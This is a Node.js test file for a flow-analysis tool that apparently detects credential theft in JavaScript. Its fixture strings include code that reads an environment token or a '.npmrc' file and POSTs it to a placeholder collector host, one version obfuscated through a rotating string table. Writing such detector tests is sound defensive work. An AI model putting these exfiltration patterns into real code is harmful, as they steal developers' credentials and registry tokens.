'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { createFlowAnalysis } = require('../src/flow-analysis');
const run = source => createFlowAnalysis([{ path: 'index.js', content: source }]).analyze('index.js');

test('unresolved CommonJS and builtin module identities retain an explicit analysis gap', () => {
  for (const expression of [
    'require(unknown)', 'const load=require;load(unknown)',
    'module.require(unknown)', 'const load=module.require;load(unknown)',
    'process.getBuiltinModule(unknown)', "require(flag?'node:fs':'node:https')"
  ]) {
    const result = run(expression);
    assert.equal(result.status, 'unmodeled', expression);
    assert.ok(result.gaps.some(g => /unresolved module specifier/.test(g.reason)), expression);
  }
});

test('literal and unchanged table module identities retain direct credential flows', () => {
  for (const prefix of ["const fs=require('node:fs'),net=require('node:https');", "const names=['node:fs','node:https'];const fs=require(names[0]),net=require(names[1]);"]) {
    const result = run(prefix + "const token=process.env.TEST_TOKEN;net.request('https://collector.invalid',{method:'POST'}).end(token);");
    assert.equal(result.status, 'parsed');
    assert.ok(result.hints.some(h => h.kind === 'credential-export'));
  }
  const benign = run("const names=['node:path'];const path=require(names[0]);module.exports=path.join('public','file');");
  assert.equal(benign.status, 'parsed'); assert.equal(benign.hints.length, 0);
});

test('mutable module tables cannot silently discard source and sink identities at joins', () => {
  const result = run("function words(){const values=['17','node:fs','node:https','/home/fixture/.npmrc','readFileSync','request'];words=()=>values;return values}const table=words();while(parseInt(table[0])!==17){table.push(table.shift())}const fs=require(words()[1]),net=require(words()[2]);const credential=fs[words()[4]](words()[3],'utf8');net[words()[5]]('https://collector.invalid',{method:'POST'}).end(credential);");
  assert.ok(result.status !== 'parsed' || result.hints.some(h => h.kind === 'credential-export'));
});

test('unresolved module identities preserve incoming sensitive taint alongside uncertainty', () => {
  const result = run("const loaded=require(process.env.TEST_TOKEN);fetch('/api',{body:loaded});");
  assert.equal(result.status, 'unmodeled');
  assert.ok(result.hints.some(h => h.kind === 'credential-export'));
});
